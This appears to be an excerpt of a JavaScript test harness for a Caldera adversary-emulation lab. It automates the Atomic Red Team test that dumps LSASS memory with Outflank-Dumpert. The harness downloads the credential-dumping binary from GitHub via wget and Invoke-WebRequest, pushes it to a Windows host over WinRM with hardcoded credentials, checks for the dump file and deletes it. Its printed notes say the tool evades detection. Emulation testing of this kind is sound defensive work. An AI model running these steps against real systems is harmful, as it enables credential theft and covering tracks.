...
async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Dump LSASS.exe Memory using direct system calls and API unhooking ===")

  const abilityId = "03455985e8bf5d2ee43947cadaca2256"
  const abilityName = "Dump LSASS.exe Memory using direct system calls and API unhooking"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

    const kaliPrereq = `if [ -f "$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe" ]; then echo "ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && wget "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -O $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe && sudo systemctl restart caldera; fi`
  ...
  try {
    ...
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\dumpert.dmp\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMP_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    // ── Step 2: Install prereqs on Kali ──
    console.log("\n  [2/7] Running kali prereq (Outflank-Dumpert download + Caldera restart)...")
    ...
    console.log(`\n  [4c/7] Deploying Outflank-Dumpert.exe to Windows...`)
    const destPath = `C:\\Users\\Public\\Outflank-Dumpert.exe`
    ...
    if (check.includes("MISSING")) {
      console.log(`    => Downloading from GitHub (clr2of8/Dumpert)...`)
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Invoke-WebRequest -Uri 'https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe' -OutFile '${destPath}'; Write-Host 'DEPLOYED'"`)
    } else {
    ...
    console.log(`    => Outflank-Dumpert.exe: ${fileCheck.trim()}`)
    ...
    // ── Step 6: Verify dump file at C:\Windows\Temp\dumpert.dmp ──
    console.log(`\n  [6/7] Verifying dump file in C:\\Windows\\Temp\\dumpert.dmp...`)
    let dumpExists = false
    let dumpSize = "unknown"
    try {
      const dumpCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Test-Path \'C:\\Windows\\Temp\\dumpert.dmp\') { $f=Get-Item \'C:\\Windows\\Temp\\dumpert.dmp\'; Write-Host \\"EXISTS $([math]::Round($f.Length/1024/1024,1))MB\\" } else { Write-Host \\"MISSING\\" }"')
      console.log(`    => Dump file: ${dumpCheck.trim()}`)
      dumpExists = dumpCheck.includes("EXISTS")
      const m = dumpCheck.match(/([\d.]+)MB/)
      if (m) dumpSize = `${m[1]}MB`
    } catch (err) {
      console.log(`    => Dump file check failed: ${err.message}`)
    }

    console.log(`\n  [7/7] Checking link facts...`)
    ...
    else if (!dumpExists) reason = "no dump file at C:\\Windows\\Temp\\dumpert.dmp"
    ...
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\dumpert.dmp\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMP_DELETED\'"')
...
async function main() {
  console.log("testAbility — Dump LSASS.exe Memory using direct system calls and API unhooking\n")
  ...
  console.log(`\n  Outflank-Dumpert ability specifics:`)
  console.log(`    - Uses direct system calls and API unhooking to evade detection`)
  console.log(`    - Bare executable — no arguments needed (creates C:\\Windows\\Temp\\dumpert.dmp by default)`)
  console.log(`    - Dump file: C:\\Windows\\Temp\\dumpert.dmp`)
  console.log(`    - Binary: clr2of8/Dumpert GitHub, deployed as Outflank-Dumpert.exe to C:\\Users\\Public\\`)
  console.log(`    - PathToAtomicsFolder replaced with C:\\Users\\Public\\Outflank-Dumpert.exe (quoted path)`)
  console.log(`    - No EULA or registry keys needed`)
